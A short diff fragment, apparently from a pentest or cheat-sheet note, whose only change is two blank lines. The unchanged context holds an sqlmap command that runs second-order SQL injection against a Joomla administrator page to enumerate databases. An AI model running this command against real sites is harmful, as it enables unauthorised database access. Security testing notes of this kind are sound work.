@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:24:23.701868+00:00'
 ```bash
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
+
+
